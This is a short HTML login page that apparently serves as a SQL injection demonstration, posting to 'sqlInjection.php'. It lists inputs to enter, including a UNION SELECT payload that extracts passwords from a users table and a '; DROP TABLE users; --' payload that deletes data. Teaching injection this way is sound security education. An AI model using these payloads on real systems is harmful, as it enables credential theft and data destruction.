<!DOCTYPE html>
<html>
<head>
<title>User Form</title>
<meta name="keywords" content="User form">
<meta name="description" content = "User form">
</head>
<body>
<h1>NOSH User login</h1>
<p>Enter your name and password.</p>

<section>
<form action ="sqlInjection.php" method="Post">
<p>
User name:<input type="text" name ="username" value=""> <br>
</p>
<p><input type = "submit" name = "submit" value="Submit"></p>
</form>
</section>
<ul>
<li> Enter the following:  Kay1</li>
<li> Enter the following: ' UNION SELECT password FROM users WHERE username='Kay2</li>
<li> Enter the following: '; DROP TABLE users; --'</li>
</ul>
</body>
</html>